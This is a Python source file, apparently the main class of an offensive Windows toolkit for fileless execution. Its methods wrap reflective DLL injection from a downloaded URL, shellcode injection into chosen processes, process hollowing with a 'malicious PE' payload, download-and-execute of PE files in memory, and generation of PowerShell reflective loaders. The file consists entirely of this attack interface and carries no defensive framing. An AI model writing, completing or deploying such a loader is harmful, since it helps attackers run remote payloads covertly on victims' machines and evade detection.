"""
Main Memory Executor Class
Coordinates all memory-only execution techniques
"""

import os
import ctypes
import platform


class MemoryExecutor:
    """
    Main class for memory-only execution
    
    Provides high-level interface to various memory execution techniques:
    - Reflective DLL Loading
    - Shellcode Injection
    - Process Hollowing
    - In-Memory PE Execution
    - PowerShell Reflective Loading
    """
    
    def __init__(self):
        """Initialize Windows API functions"""
        self._check_platform()
        self._init_api()
    
    def _check_platform(self):
        """Check if running on Windows"""
        if os.name != 'nt':
            print("[!] Warning: This toolkit is designed for Windows systems")
            print("[!] Some features may not work on other platforms")
        
        self.os_type = os.name
        self.platform = platform.system()
        
        print(f"[+] Memory Executor initialized")
        print(f"[+] Platform: {self.platform}")
    
    def _init_api(self):
        """Initialize Windows API functions"""
        if os.name == 'nt':
            try:
                self.kernel32 = ctypes.windll.kernel32
                self.ntdll = ctypes.windll.ntdll
                print(f"[+] Windows API loaded")
            except Exception as e:
                print(f"[-] Failed to load Windows API: {e}")
                self.kernel32 = None
                self.ntdll = None
        else:
            self.kernel32 = None
            self.ntdll = None
    
    def reflective_dll_injection(self, dll_url, target_process=None):
        """
        Load DLL entirely in memory without touching disk
        
        Args:
            dll_url (str): URL to download DLL from
            target_process (int, optional): Target process PID
            
        Returns:
            bool: True if successful, False otherwise
        """
        if os.name != 'nt':
            print("[!] DLL injection only available on Windows")
            return False
        
        from ..techniques.dll_injection import ReflectiveDLLInjector
        
        injector = ReflectiveDLLInjector(self.kernel32, self.ntdll)
        return injector.inject(dll_url, target_process)
    
    def inject_shellcode(self, shellcode_hex, target_pid=None):
        """
        Inject and execute shellcode in memory
        
        Args:
            shellcode_hex (str): Hex-encoded shellcode
            target_pid (int, optional): Target process PID
            
        Returns:
            bool: True if successful, False otherwise
        """
        if os.name != 'nt':
            print("[!] Shellcode injection only available on Windows")
            return False
        
        from ..techniques.shellcode_injection import ShellcodeInjector
        
        injector = ShellcodeInjector(self.kernel32)
        return injector.inject(shellcode_hex, target_pid)
    
    def process_hollowing(self, target_exe, payload_data):
        """
        Process hollowing: Create legitimate process, hollow it, inject payload
        
        Args:
            target_exe (str): Legitimate executable path
            payload_data (bytes): Malicious PE data to inject
            
        Returns:
            bool: True if successful, False otherwise
        """
        if os.name != 'nt':
            print("[!] Process hollowing only available on Windows")
            return False
        
        from ..techniques.process_hollowing import ProcessHollower
        
        hollower = ProcessHollower(self.kernel32, self.ntdll)
        return hollower.hollow(target_exe, payload_data)
    
    def execute_pe_from_memory(self, pe_url):
        """
        Download and execute PE file entirely from memory
        
        Args:
            pe_url (str): URL to download PE from
            
        Returns:
            bool: True if successful, False otherwise
        """
        if os.name != 'nt':
            print("[!] PE execution only available on Windows")
            return False
        
        from ..techniques.pe_execution import PEExecutor
        
        executor = PEExecutor(self.kernel32)
        return executor.execute(pe_url)
    
    def generate_powershell_reflective_loader(self, payload_url, output_file):
        """
        Generate PowerShell script for reflective loading
        
        Args:
            payload_url (str): URL to download payload from
            output_file (str): Output PowerShell script path
            
        Returns:
            bool: True if successful, False otherwise
        """
        from ..generators.powershell_generator import PowerShellGenerator
        
        generator = PowerShellGenerator()
        return generator.generate(payload_url, output_file)